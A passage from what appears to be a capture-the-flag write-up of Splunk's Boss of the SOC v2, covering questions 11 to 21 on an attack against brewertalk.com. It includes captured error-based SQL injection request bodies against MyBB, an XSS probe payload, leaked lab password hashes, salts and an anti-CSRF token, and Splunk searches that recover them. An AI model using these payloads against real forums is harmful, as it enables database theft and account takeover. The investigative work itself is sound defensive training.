regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT uid FROM mybb_users ORDER BY UID LIMIT 1,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT uid FROM mybb_users ORDER BY UID LIMIT 2,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT uid FROM mybb_users ORDER BY UID LIMIT 3,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT uid FROM mybb_users ORDER BY UID LIMIT 4,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT uid FROM mybb_users ORDER BY UID LIMIT 5,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT username FROM mybb_users ORDER BY UID LIMIT 0,1)))),NULL) and '1
...
```
> ANSWER: updatexml
{: .prompt-info } 

#### Question 11 (204): What is Frank Ester's password salt value on www.brewertalk.com?

```sql
index=botsv2 sourcetype=stream:http | search 45.77.65.211 
|rex field=dest_content "<dd>(?<sql_error>\d+ - XPATH syntax error: '.*?')</dd>"
|table _time sql_error
|where sql_error!= ""
|reverse
```

```sql
sql_error
1105 - XPATH syntax error: ':IAu4XYea'
1105 - XPATH syntax error: ':8'
1105 - XPATH syntax error: ':ghoppy@froth.ly'
1105 - XPATH syntax error: ':15'
1105 - XPATH syntax error: ':ghoppy'
1105 - XPATH syntax error: ':6'
1105 - XPATH syntax error: ':3'
1105 - XPATH syntax error: ':1'
1105 - XPATH syntax error: ':f'
1105 - XPATH syntax error: ':6a287cfc500c0b748bf0e4c4c44f7d6'
1105 - XPATH syntax error: ':32'
1105 - XPATH syntax error: ':gGsxysZL'
1105 - XPATH syntax error: ':8'
1105 - XPATH syntax error: ':frankesters47@gmail.com'
1105 - XPATH syntax error: ':23'
1105 - XPATH syntax error: ':frank'
1105 - XPATH syntax error: ':5'
1105 - XPATH syntax error: ':1'
1105 - XPATH syntax error: ':1'
1105 - XPATH syntax error: ':6'
1105 - XPATH syntax error: ':mybb_users'
1105 - XPATH syntax error: ':8'
1105 - XPATH syntax error: ':thebeerguy2112@gmail.com'
1105 - XPATH syntax error: ':24'
1105 - XPATH syntax error: ':thebeerguy'
1105 - XPATH syntax error: ':10'
1105 - XPATH syntax error: ':5'
1105 - XPATH syntax error: ':1'
1105 - XPATH syntax error: ':4'
1105 - XPATH syntax error: ':f91904c1dd2723d5911eeba409cc0d1'
1105 - XPATH syntax error: ':32'
1105 - XPATH syntax error: ':tlX7cQPE'
1105 - XPATH syntax error: ':8'
1105 - XPATH syntax error: ':btun@froth.ly'
1105 - XPATH syntax error: ':13'
1105 - XPATH syntax error: ':btun'
1105 - XPATH syntax error: ':4'
1105 - XPATH syntax error: ':4'
1105 - XPATH syntax error: ':1'
1105 - XPATH syntax error: ':8'
1105 - XPATH syntax error: ':ecc0fd3e2a6b305291b74eb2dcf22c0'
1105 - XPATH syntax error: ':32'
1105 - XPATH syntax error: ':20'
1105 - XPATH syntax error: ':kIagerfield'
1105 - XPATH syntax error: ':11'
1105 - XPATH syntax error: ':24'
1105 - XPATH syntax error: ':2'
1105 - XPATH syntax error: ':a'
1105 - XPATH syntax error: ':1b1257227b3b6a3c0ed16cb73889b4e'
1105 - XPATH syntax error: ':32'
1105 - XPATH syntax error: ':UltcPDvA'
1105 - XPATH syntax error: ':8'
1105 - XPATH syntax error: ':klagerfield@froth.ly'
1105 - XPATH syntax error: ':20'
1105 - XPATH syntax error: ':kevin'
1105 - XPATH syntax error: ':5'
1105 - XPATH syntax error: ':17'
1105 - XPATH syntax error: ':2'
1105 - XPATH syntax error: ':9'
1105 - XPATH syntax error: ':933c02014b0e2da094ec96fd8901047'
1105 - XPATH syntax error: ':32'
1105 - XPATH syntax error: ':HudBtU9K'
1105 - XPATH syntax error: ':f'
1105 - XPATH syntax error: ':b3f1b68d1c412eddb79dc441497d59b'
1105 - XPATH syntax error: ':32'
1105 - XPATH syntax error: ':tXXJNkV1'
1105 - XPATH syntax error: ':8'
1105 - XPATH syntax error: ':kIagerfield@froth.ly'
```

> ANSWER: gGsxysZL
{: .prompt-info }

#### Question 12 (205): What is user btun's password on brewertalk.com?
We already knew that the adversary used SQL injection with the `updatexml()` built-in function to retrieve unauthorized data from the MySQL server. We also know that after the `8` value, there’s a hash-which means an 8-character string was extracted first.

So, the question is: What comes after that?

The `32` and the random string afterward...

YES! That’s probably an MD5 hash of the password.


```html
dest_content: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head profile="http://gmpg.org/xfn/11">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Craft Brew Forums - Internal Error</title>
	<style type="text/css">
		body { background: #efefef; color: #000; font-family: Tahoma,Verdana,Arial,Sans-Serif; font-size: 12px; text-align: center; line-height: 1.4; }
		a:link { color: #026CB1; text-decoration: none;	}
		a:visited {	color: #026CB1;	text-decoration: none; }
		a:hover, a:active {	color: #000; text-decoration: underline; }
		#container { width: 600px; padding: 20px; background: #fff;	border: 1px solid #e4e4e4; margin: 100px auto; text-align: left; -moz-border-radius: 6px; -webkit-border-radius: 6px; border-radius: 6px; }
		h1 { margin: 0; background: url(/member.php?action=mybb_logo) no-repeat;	height: 82px; width: 248px; }
		#content { border: 1px solid #026CB1; background: #fff; -moz-border-radius: 3px; -webkit-border-radius: 3px; border-radius: 3px; }
		h2 { font-size: 12px; padding: 4px; background: #026CB1; color: #fff; margin: 0; }
		.invisible { display: none; }
		#error { padding: 6px; }
		#footer { font-size: 12px; border-top: 1px dotted #DDDDDD; padding-top: 10px; }
		dt { font-weight: bold; }
	</style>
</head>
<body>
	<div id="container">
		<div id="logo">
			<h1><a href="http://www.mybb.com/" title="MyBB"><span class="invisible">MyBB</span></a></h1>
		</div>

		<div id="content">
			<h2>MyBB SQL Error</h2>

			<div id="error">
				<p>MyBB has experienced an internal SQL error and cannot continue.</p><dl>
<dt>SQL Error:</dt>
<dd>1105 - XPATH syntax error: ':f91904c1dd2723d5911eeba409cc0d1'</dd>
<dt>Query:</dt>
<dd>
			SELECT q.*, s.sid
			FROM mybb_questionsessions s
			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 2,1), 1, 31))),NULL) and '1'
		</dd>
</dl>

				<p id="footer">Please contact the <a href="http://www.mybb.com">MyBB Group</a> for technical support.</p>
			</div>
		</div>
	</div>
</body>
</html>
...
```

`<dd>1105 - XPATH syntax error: ':f91904c1dd2723d5911eeba409cc0d1'</dd>` We see this 32-character string strongly resembles an MD5 hash.

Unfortunately, I wasn’t able to retrieve the plaintext password directly due to limited resources. To crack it, you would need a CSV file named `top_1000.csv` (created by Splunk) and perform a brute-force attack using the associated salt value: `tlX7cQPE`.

However, the actual answer (after cracking the hash) is `123456`

> ANSWER: 123456  
{: .prompt-info }

#### Question 13 (206): What are the characters displayed by the XSS probe? Answer guidance: Submit answer in native language or character set.
```sql
index=botsv2 sourcetype="stream:http" www.brewertalk.com AND 2Fscript%3E
|eval decode = urldecode('form_data')
|table form_data decode
```

`action=activate&amp;uid=-1&amp;code=&quot;&gt;&lt;script&gt;alert(&#x27;대동&#x27;)&lt;/script&gt;`

> ANSWER: 대동
{: .prompt-info }

####  Question 14 (207): What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.
```sql
index=botsv2 sourcetype="stream:http" www.brewertalk.com AND 2Fscript%3E  
| eval decode = urldecode('form_data')  
| search decode="metric=mybb[lastvisit]=1502408189; mybb[lastactive]=1502408189"
```

> ANSWER: 1502408189
{: .prompt-info }

#### Question 15 (208): The brewertalk.com web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield's computer and used to help create an unauthorized admin user on brewertalk.com?
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/1">
	<title>Edit User</title>
	<meta name="author" content="MyBB Group" />
	<meta name="copyright" content="Copyright 2017 MyBB Group." />
	<link rel="stylesheet" href="styles/default/main.css" type="text/css" />
	<link rel="stylesheet" href="styles/default/modal.css" type="text/css" />
	<link rel="stylesheet" href="styles/default/user.css" type="text/css" />
	<script type="text/javascript" src="../jscripts/jquery.js"></script>
	<script type="text/javascript" src="../jscripts/jquery.plugins.min.js"></script>
	<script type="text/javascript" src="../jscripts/general.js"></script>
	<script type="text/javascript" src="./jscripts/admincp.js"></script>
	<script type="text/javascript" src="./jscripts/tabs.js"></script>
	<link rel="stylesheet" href="jscripts/jqueryui/css/redmond/jquery-ui.min.css" />
	<link rel="stylesheet" href="jscripts/jqueryui/css/redmond/jquery-ui.structure.min.css" />
	<link rel="stylesheet" href="jscripts/jqueryui/css/redmond/jquery-ui.theme.min.css" />
	<script src="jscripts/jqueryui/js/jquery-ui.min.js"></script>
  <style type="text/css">.popup_button { display: none; } </style>
  <script type="text/javascript">
//<![CDATA[
	document.write('<style type="text/css">.popup_button { display: inline; } .popup_menu { display: none; }<\/style>');
//]]>
</script>
	<script type="text/javascript">
//<![CDATA[
var loading_text = 'Loading<br />Please wait...';
var cookieDomain = '.brewertalk.com';
var cookiePath = '/';
var cookiePrefix = '';
var imagepath = '../images';

lang.unknown_error = "An unknown error has occurred.";
lang.saved = "Saved";
//]]>
</script>

	<link rel="stylesheet" href="../jscripts/sceditor/editor_themes/mybb.css" type="text/css" media="all" />
	<script type="text/javascript" src="../jscripts/sceditor/jquery.sceditor.bbcode.min.js"></script>
	<script type="text/javascript" src="../jscripts/bbcodes_sceditor.js"></script></head>
<body>
<div id="container">
	<div id="logo"><h1><span class="invisible">MyBB Admin CP</span></h1></div>
	<div id="welcome"><span class="logged_in_as">Logged in as <a href="index.php?module=user-users&amp;action=edit&amp;uid=17" class="username">kevin</a></span> | <a href="http://www.brewertalk.com" target="_blank" class="forum">View Forum</a> | <a href="index.php?action=logout&amp;my_post_key=1bc3eab741900ab25c98eee86bf20feb" class="logout">Log Out</a></div>
<div id="menu">
<ul>
<li><a href="index.php">Home</a></li>
<li><a href="index.php?module=config">Configuration</a></li>
<li><a href="index.php?module=forum">Forums &amp; Posts</a></li>
<li><a href="index.php?module=user" class="active">Users &amp; Groups</a></li>
<li><a href="index.php?module=style">Templates &amp; Style</a></li>
<li><a href="index.php?module=tools">Tools &amp; Maintenance</a></li>
</ul>
</div>	<div id="page">
		<div id="left_menu">
<div class="left_menu_box">
<div class="title">Users &amp; Groups</div>
<ul class="menu"><li class="active"><a href="index.php?module=user-users">Users</a></li>
<li class=""><a href="index.php?module=user-groups">Groups</a></li>
<li class=""><a href="index.php?module=user-titles">User Titles</a></li>
<li class=""><a href="index.php?module=user-banning">Banning</a></li>
<li class=""><a href="index.php?module=user-admin_permissions">Admin Permissions</a></li>
<li class=""><a href="index.php?module=user-mass_mail">Mass Mail</a></li>
<li class=""><a href="index.php?module=user-group_promotions">Group Promotions</a></li>
</ul></div>
		</div>
		<div id="content">
			<div class="breadcrumb">
<a href="index.php">Home</a> &raquo; <a href="index.php?module=user-users">Users</a> &raquo; <span class="active">Edit User: kIagerfield</span>			</div>
           <div id="inner">
<div id="flash_message" class="success">
The user has been created successfully.
</div>
<form action="index.php?module=user-users&amp;action=edit&amp;uid=24" method="post" enctype="multipart/form-data">
<input type="hidden" name="my_post_key" value="1bc3eab741900ab25c98eee86bf20feb" />
<div class="nav_tabs">	<ul>
		<li class=" active"><a href="">Edit User</a></li>
	</ul>
	<div class="tab_description">Here you can edit this users profile, settings, and signature; see general statistics; and visit other pages for further information relating to this user.</div>
</div><ul class="tabs" id="tabs">
<li class=" first"><a href="#tab_overview">Overview</a></li>
<li class=""><a href="#tab_profile">Profile</a></li>
<li class=""><a href="#tab_settings">Account Settings</a></li>
<li class=""><a href="#tab_signature">Signature</a></li>
<li class=""><a href="#tab_avatar">Avatar</a></li>
<li class=" last"><a href="#tab_modoptions">Moderator Options</a></li>
</ul>
<div id="tab_overview">
<div class="border_wrapper">
	<div class="title">User Overview: kIagerfield</div>
<table class="general" cellspacing="0">
	<thead>
		<tr>
			<th class="align_center first">Avatar</th>
			<th class="align_center last" colspan="2">General Account Statistics</th>
		</tr>
	</thead>
	<tbody>
		<tr class="first">
			<td class="first" style="" id="" rowspan="6" width="1"><div style="width: 126px; height: 126px;" class="user_avatar"><img src="../images/default_avatar.png" style="margin-top: 3px" width="120" height="120" alt="" /></div></td>
			<td class="alt_col" style="" id=""><strong>Email Address:</strong> <a href="mailto:kIagerfield@froth.ly">kIagerfield@froth.ly</a></td>
			<td class="last" style="" id=""><strong>Last Active:</strong> Less than 1 minute ago</td>
		</tr>
		<tr class="alt_row">
			<td class="first" style="" id=""><strong>Registration Date:</strong> Less than 1 minute ago</td>
			<td class="last alt_col" style="" id=""><strong>Local Time:</strong> 08-10-2017 at 11:49 PM</td>
		</tr>
		<tr>
			<td class="first" style="" id=""><strong>Posts:</strong> 0</td>
			<td class="last alt_col" style="" id=""><strong>Age:</strong> N/A</td>
		</tr>
		<tr class="alt_row">
			<td class="first" style="" id=""><strong>Posts per day:</strong> 0</td>
			<td class="last alt_col" style="" id=""><strong>Reputation:</strong> <!-- start: postbit_reputation_formatted -->
<strong class="reputation_neutral">0</strong>
<!-- end: postbit_reputation_formatted --></td>
		</tr>
		<tr>
			<td class="first" style="" id=""><strong>Percent of total posts:</strong> 0</td>
			<td class="last alt_col" style="" id=""><strong>Warning Level:</strong> <!-- start: postbit_warninglevel_formatted -->
<span class="normal_warning">0%</span>
<!-- end: postbit_warninglevel_formatted --></td>
		</tr>
		<tr class="last alt_row">
			<td class="first" style="" id=""><strong>Registration IP:</strong> </td>
			<td class="last alt_col" style="" id=""><strong>Last Known IP:</strong> </td>
		</tr>
	</tbody>
</table>
</div></div>
<div id="tab_profile">
<div class="border_wrapper">
	<div class="title">Required Profile Information: kIagerfield</div>
<table class="general form_container " cellspacing="0">
	<tbody>
		<tr class="first">
			<td class="first" style="" id=""><label for="username">Username <em>*</em></label><div class="form_row"><input type="text" name="username" value="kIagerfield" class="text_input" id="username" /></div>
</td>
		</tr>
		<tr class="alt_row">
			<td class="first" style="" id=""><label for="new_password">New Password</label>
<div class="description">Only required if changing</div>
<div class="form_row"><input type="password" name="new_password" value="" class="text_input" id="new_password" autocomplete="off" /></div>
</td>
		</tr>
		<tr>
			<td class="first" style="" id=""><label for="confirm_new_password">Confirm New Password</label>
<div class="description">Only required if changing</div>
<div class="form_row"><input type="password" name="confirm_new_password" value="" class="text_input" id="confirm_new_password" /></div>
</td>
		</tr>
		<tr class="alt_row">
			<td class="first" style="" id=""><label for="email">Email Address <em>*</em></label><div class="form_row"><input type="text" name="email" value="kIagerfield@froth.ly" class="text_input" id="email" /></div>
</td>
		</tr>
		<tr>
			<td class="first" style="" id=""><label for="usergroup">Primary User Group <em>*</em></label><div class="form_row"><select name="usergroup" id="usergroup">
<option value="4" selected="selected">Administrators</option>
<option value="5">Awaiting Activation</option>
<option value="7">Banned</option>
<option value="6">Moderators</option>
<option value="2">Registered</option>
<option value="3">Super Moderators</option>
</select>
</div>
</td>
		</tr>
		<tr class="alt_row">
			<td class="first" style="" id=""><label for="additionalgroups">Additional User Groups</label>
<div class="description">Use CTRL to select multiple groups</div>
<div class="form_row"><select name="additionalgroups[]" multiple="multiple" id="additionalgroups" size="5">
<option value="4">Administrators</option>
<option value="5">Awaiting Activation</option>
<option value="7">Banned</option>
<option value="6">Moderators</option>
<option value="2">Registered</option>
<option value="3">Super Moderators</option>
</select>
</div>
</td>
		</tr>
		<tr>
			<td class="first" style="" id=""><label for="displaygroup">Display User Group <em>*</em></label><div class="form_row"><select name="displaygroup" id="displaygroup">
<option value="0">Use Primary User Group</option>
<option value="4" selected="selected">Administrators</option>
<option value="5">Awaiting Activation</option>
<option value="7">Banned</option>
<option value="6">Moderators</option>
<option value="2">Registered</option>
<option value="3">Super Moderators</option>
</select>
</div>
</td>
		</tr>
		<tr class="alt_row">
			<td class="first" style="" id=""><label for="postnum">Post Count <em>*</em></label><div class="form_row"><input type="number" name="postnum" value="0" class="text_input" id="postnum" /></div>
</td>
		</tr>
		<tr class="last">
			<td class="first" style="" id=""><label for="threadnum">Thread Count <em>*</em></label><div class="form_row"><input type="number" name="threadnum" value="0" class="text_input" id="threadnum" /></div>
</td>
		</tr>
	</tbody>
</table>
</div>
```
> ANSWER: 1bc3eab741900ab25c98eee86bf20feb
{: .prompt-info }

#### Question 16 (209): What brewertalk.com username was maliciously created by a spearphishing attack?

> ANSWER: kIagerfield
{: .prompt-info }

### Series 300

#### Question 17 (300): According to Frothly's records, what is the likely MAC address of Mallory's corporate MacBook? Answer guidance: Her corporate MacBook has the hostname MACLORY-AIR13.
When I first read this question, it seemed pretty easy at first, BUT IN REALITY, IT WAS NOT!

I started by narrowing down the scope using: `|metasearch index=botsv2 sourcetype=* MACLORY-AIR13 | fieldsummary`.

I thought I could get some useful information, especially from stream:ldap, since it contains basic details about hosts.

However, I encountered around 20 million event records-most of them from the collectd sourcetype, which I wasn't expecting. Ideally, I wanted something like stream:* (but yeah, of course, it's a MacBook, a Unix-like system...).

![pic12](/assets/images/botsv2/pic12.png)

At this point, I went back to my metasearch and used `"MACLORY"` instead of `"MACLORY-AIR13S"`.

![pic13](/assets/images/botsv2/pic13.png)
_We got 2 more news sourcetype_

We got two more sourcetypes to investigate!

Seeing `wineventlog` was a potential breakthrough - it suggested that Mallory’s MacBook might be domain-joined.

```xml
The event log confirmed a successful logon from Mallory’s account:
08/18/2017 02:27:35 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=venus.frothly.local
TaskCategory=Logon
OpCode=Info
RecordNumber=151229
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

Impersonation Level:		Impersonation

New Logon:
	Security ID:		FROTHLY\mallory.kraeusen
	Account Name:		mallory.kraeusen
	Account Domain:		FROTHLY
	Logon ID:		0x33793D
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	MACLORY-AIR13S
	Source Network Address:	10.0.4.4
	Source Port:		49735

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128
```
At this point, I thought I was really on the right track. We had `10.0.4.4` as a significant artifact, so I ran a `rex` search to extract MAC addresses:

```sql
index=botsv2 sourcetype=* 10.0.4.4 
| regex _raw="([A-Fa-f0-9]{2}[:-]){5}[A-Fa-f0-9]{2}"
```
This returned `58:49:3B:8A:8B:11`, the only MAC address I could extract from these events. The only other one I found - `00:0C:29:ED:5F:CE` - belonged to Frothly’s Domain Controller `(10.0.1.100)`.

But that wasn’t the right answer! Damn.


I moved on to `osquery_results`, hoping to find the MAC address there:
```sql
index=botsv2 sourcetype="osquery_results" MACLORY
| regex _raw="([A-Fa-f0-9]{2}[:-]){5}[A-Fa-f0-9]{2}"
```
Boom! 27 events came back. A silver lining!

```sql
index=botsv2 sourcetype="osquery_results" MACLORY
| regex _raw="([A-Fa-f0-9]{2}[:-]){5}[A-Fa-f0-9]{2}"
|table columns.address columns.mac
|stats count by columns.address columns.mac
|sort - count
```
![pic14](/assets/images/botsv2/pic14.png)

But… none of them were the right answer.

I had failed to find the answer and was forced to buy a hint - which led me to an unexpected situation: **Use Asset Center in ES.**

Yeah, I didn’t have access to that, so…

According to the answer database, the correct MAC address was:`02:50:41:00:01:01`

Using that information, I found only one event:

```json
{
  "name": "pack_incident-response_arp_cache",
  "hostIdentifier": "kutekitten.local",
  "calendarTime": "Tue Aug 29 10:11:29 2017 UTC",
  "unixTime": "1504001489",
  "decorations": {
    "host_uuid": "00000000-0000-1000-8000-000C296A4C57"
  },
  "columns": {
    "address": "10.0.4.2",
    "interface": "lo0",
    "mac": "02:50:41:00:01:01",
    "permanent": "1"
  },
  "action": "added"
}
host = kutekittensource = /var/log/osquery/osqueryd.results.logsourcetype = osquery_results
```
The hostname `kutekitten.local` seemed unusual - it didn’t look like a corporate device but rather Mallory’s personal one.

I went back to `| metasearch index=botsv2 sourcetype=* 02:50:41:00:01:01 | fieldsummary`
![pic15](/assets/images/botsv2/pic15.png)
_a ton of datasets_

But, when i use these data with MAC Address value, i got **zero** events except for the one above....WELL, I FAILED THIS ONE !

> ANSWER: 02:50:41:00:01:01
{: .prompt-info }

#### Question 18 (301): What episode of Game of Thrones is Mallory excited to watch? Answer guidance: Submit the HBO title of the episode.
Although we failed to answer the previous question, we gathered many artifacts that will help us prepare for the next ones. Now that we know Mallory's account name - `Account Name: mallory.kraeusen`, we can get an overview of datasets to investigate further.

```sql
|metasearch index=botsv2 sourcetype=* mallory | fieldsummary
```
![pic16](/assets/images/botsv2/pic16.png)
_around 7k events_

Some valuable sourcetypes I could look into were:

- `stream:smtp`: Only 11 events. This sourcetype could provide the answer if there's a hint in the content_body of the emails.
- `stream:http`: If there are any queries related to Game of Thrones, we might catch them!

Since Mallory uses a **MacBook**, the other sourcetypes are not my priority.

Start with `stream:smtp`, let see if we can find any relevant information about Game of Throne. 

```sql
index=botsv2 sourcetype=stream:smtp mallory
|reverse
```
The only one subject found was: "Max help me pretty please <3 <3 <3". 

I assume this is a conversation between **Mallory and Max** - her boyfriend or a close friend (since we see three "<3" emojis, right? xD).

Using CyberChef to decode Base64, the first email that Mallory sent to Max reads:

```text
Hey max…

 Hey… Good seeing you last week at ComicCon.  I was curious if you could help me out…. That jerk face I work for right now gave me a MacBook (FINALLY!) but refused to pay for office 2016 saying “You can use the laptop with windows right next to me if you need to”. Ew. No.  I don’t suppose you have a office 2017 key? I’ll totally help you with your Korean ninja costume for halloween. You do know that ninjas are Japanese, tho?

Love ya

M@l
```
So, Mallory was asking for Office software - PowerPoint, Excel, Word, etc.

Max replied that he had her covered:
```text
     Of course! I got what you need!!!! I just pulled it off the torrentz the
other day so YMMV
```
He then sent Mallory an attachment: `Office2016_Patcher_For_OSX.torrent`

Mallory loved it - "So amazing Max! I will be sure to order you a case of Grave Before Shave beard oil for Xmas"

In the next email, Max said:
```text
"Also... I still cannot believe you didn't get my reference when I called
you Mallory of the Dragons. Here's the latest so you can FINALLY catch up.
You TOTALLY look like Khaleesi. Maybe some day I can be your Drogo <3"
```
With an attachment: `GoT.S7E2.BOTS.BOTS.BOTS.mkv.torrent`

**THAT'S IT !**

For those unfamiliar with Game of Thrones, the characters who own dragons are the strongest ones. "GoT" clearly stands for Game of Thrones.

S7E2 should be Season 7 - Episode 2, with that information, we could googling and get the title of the episode.

Well, this isn't part of the official BOTS series, but you should check out ["Power is Power"](https://www.youtube.com/watch?v=r1LIFKNFt3Q) from the Game of Thrones final season - it's dope!

"Heavy is the crown

Only for the weak
 
A knife in my heart couldn’t slow me down

‘Cause power is power, my fire never goes out

I rise from my scars, nothing hurts me now

‘Cause power is power, now watch me burn it down"

> ANSWER: Stormborn
{: .prompt-info }


P/S: Not only did I find the right answer to the question, but I also discovered some really noteworthy details in these email contents. These might help us gain a broader perspective on this incident in the future. 

The first one:
```text
I mean... seems fine.  Lots of pressure on Amber though.  I've got the syst=
ems lined up and our processe methodology.

BTW< Who the hell is James Brodsky?  He was here the other day listening to=
 "Yacht Rock"?  What the hell is "Yacht Rock" and who hired him? He just ke=
pt talking about Spotify station "Yacht Rock" and complaining that he lost =
his USB.
```

And the second one:
```
Ugh. Can you believe this.  Are you guys hiring yet? This place is getting =
weirder and weird.  Kevin is such a weirdo
```

We also know that Kevin was the Frothly forum administrator. So, based on these two emails, we might start seeing a bigger picture in the next questions


#### Question 19 (302): What is Mallory Krauesen's phone number? Answer guidance: ddd-ddd-dddd where d=[0-9]. No country code.
This question drove me crazy just like the 17 before it. 😵‍💫

The SPL searches that i performed to find the Phone Number
```sql
index=botsv2 sourcetype=stream:* phone
| rex field=_raw "(?<phone_number>\b\d{3}-\d{3}-\d{4}\b)"
| table phone_number | stats values(phone_number)

results:
123-456-7890
330-987-5610
443-839-0986
718-425-9877
888-588-4258
```

I started looking into these phone numbers, but none of them were the right answer. My instinct was screaming: "Why does this question feel just like Question 17?" 

That was the moment I decided to check the hint-and yeah, here it was: **Use Identity Center in ES.**

So, if you really want to fully experience the Boss of the SOC (BOTS) v2 Series, you might need Splunk Enterprise Security (ES), which is a paid Splunk product.
Or… you could join a live event! 

The answer is: 415-867-5309 based on answers database

> ANSWER: 415-867-5309
{: .prompt-info }

#### Question 20 (303): Enterprise Security contains a threat list notable event for MACLORY-AIR13 and suspect IP address 5.39.93.112. What is the name of the threatlist (i.e. Threat Group) that is triggering the notable?
Once again, another question that requires Splunk Enterprise Security (ES) to get the exact answer! 

So, moving on to the next question-I just hope it doesn't involve Splunk ES again! 


> ANSWER: iblocklist_tor
{: .prompt-info }
#### Question 21 (304): Considering the threatlist you found in the question above, and related data, what protocol often used for file transfer is actually responsible for the generated traffic?
Based on the previous question, even though we can't fully investigate the logs, we already have a useful Indicator of Compromise (IoC):

- Suspect IP Address → `5.39.93.112`

There are tons of sourcetypes we could explore, but for me, the most interesting ones are definitely Palo Alto Firewall - related sourcetypes:
- pan:system
- pan:threat
- pan:traffic

Why Palo Alto Firewall logs?
- The suspect IP is an external IP address
- The question refers to suspected file transfers, which could indicate data exfiltration.
- Firewalls monitor all inbound and outbound traffic, and since traditional firewalls operate at Layer 4 (Transport Layer) and advanced firewalls at Layer 7 (Application Layer), they definitely log the protocol used.

Based on that information, we will perform basic SPL search to investigate traffic from the suspect IP:
```sql
index=botsv2 sourcetype=pan:* 
|search 5.39.93.112
```
![pic17](/assets/images/botsv2/pic17.png)
_63 events found which is great number to dive into!_

As soon as I checked the first event, I immediately pinpointed the protocol used for data exfiltration.
![pic18](assets/images/botsv2/pic18.png)

So, what's BitTorrent ? Base on [Wikipedia](https://en.wikipedia.org/wiki/BitTorrent#), BitTorrent is a peer-to-peer (P2P) communication protocol for file sharing. If you've ever downloaded cracked games or pirated software at high speeds, you've probably used BitTorrent. **In fact, if you've browsed Russian forums, you've likely seen tons of torrents - they're some of the best crackers out there imo!** 

But here's the downside:

"One concern is the UDP flood attack. BitTorrent implementations often use μTP for their communication. To achieve high bandwidths, the underlying protocol used is UDP, which allows spoofing of source addresses of internet traffic. It has been possible to carry out denial-of-service attacks in a P2P lab environment, where users running BitTorrent clients act as amplifiers for an attack at another service. However this is not always an effective attack because ISPs can check if the source address is correct.

Several studies on BitTorrent found files available for download containing malware. In particular, one small sample indicated that 18% of all executable programs available for download contained malware. Another study claims that as much as 14.5% of BitTorrent downloads contain zero-day malware, and that BitTorrent was used as the distribution mechanism for 47% of all zero-day malware they have found."

> ANSWER: bittorrent
{: .prompt-info }

